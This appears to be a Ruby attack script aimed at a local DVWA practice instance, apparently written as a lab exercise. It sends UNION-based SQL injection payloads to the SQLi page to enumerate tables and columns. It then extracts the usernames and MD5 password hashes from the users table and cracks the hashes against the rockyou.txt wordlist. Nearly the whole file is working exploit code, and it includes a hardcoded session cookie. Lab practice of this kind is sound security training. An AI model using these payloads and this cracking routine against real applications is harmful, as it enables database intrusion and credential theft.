require "net/http"
require "nokogiri"
require "digest"
require "colorize"

cookie = "security=low; __stripe_mid=37d68129-f74e-428b-90ce-72715d2b34fa; PHPSESSID=jl8h4o0kvofc4nji8okhbjpc4e"
url = "http://localhost:8080/DVWA-master/vulnerabilities/sqli/?id=%s&Submit=Submit#"

def getTableName(url, cookies)
  getTableNamePayload = "'union select 1,GROUP_CONCAT(table_schema,':',table_name)FROM information_Schema.tables  -- -"
  url = URI(url.to_s % getTableNamePayload.to_s)
  req = Net::HTTP::Get.new(url)
  req["Cookie"] = cookies

  res = Net::HTTP.start(url.hostname, url.port) { |http|
    http.request(req)
  }
  doc = Nokogiri::HTML(res.body)
  puts doc.css("pre")[1].content.gsub("ID: 1'union select 1,GROUP_CONCAT(table_schema,':',table_name)FROM information_Schema.tables  -- -First name: 1Surname:", "")
end

def getColumnName(url, cookies)
  getColumnNamePayload = "1'union select 1,GROUP_CONCAT(table_schema , ':',column_name)FROM information_Schema.columns where table_name = 'users'  -- -"
  url = URI(url.to_s % getColumnNamePayload.to_s)
  req = Net::HTTP::Get.new(url)
  req["Cookie"] = cookies
  res = Net::HTTP.start(url.hostname, url.port) { |http|
    http.request(req)
  }
  doc = Nokogiri::HTML(res.body)
  puts doc.css("pre")[1].content.gsub("ID: 1'union select 1,GROUP_CONCAT(table_schema , ':',column_name)FROM information_Schema.columns where table_name = 'users'  -- -First name: 1Surname:", "")
end

def getAllUser(url, cookies)
  getAllUserPayload = "'union select 1,user FROM users -- -"
  users = []
  url = URI (url.to_s % getAllUserPayload.to_s)
  req = Net::HTTP::Get.new(url)
  req["Cookie"] = cookies
  res = Net::HTTP.start(url.hostname, url.port) { |http|
    http.request(req)
  }
  doc = Nokogiri::HTML(res.body)
  doc.css("pre").each do |pre|
    users.append pre.content[61..].gsub " ", ""
  end
  return users
end

def getAllPassword(url, cookies)
  getPasswordPayload = "'union select 1,password FROM users -- -"
  passwords = []
  url = URI(url.to_s % getPasswordPayload.to_s)
  req = Net::HTTP::Get.new(url)
  req["Cookie"] = cookies
  res = Net::HTTP.start(url.hostname, url.port) { |http|
    http.request(req)
  }
  doc = Nokogiri::HTML(res.body)
  doc.css("pre").each do |pre|
    passwords.append pre.content[65..].gsub " ", ""
  end
  return passwords
end

def BruteForce(listsPassword, passwordWentCrack)
  i = 0
  while i < passwordWentCrack.length
    File.open(listsPassword, "r").each do |passwords|
      hash = Digest::MD5::hexdigest passwords.gsub "\n", ""
      $stdout.write "\r#{hash}:"
      if hash == passwordWentCrack[i]
        puts "#{passwords}".green.gsub "\n", ""
        i += 1
        if i > 3; exit end
      end
    end
  end
end

getTableName url, cookie
getColumnName url, cookie
BruteForce("rockyou.txt", getAllPassword(url, cookie))
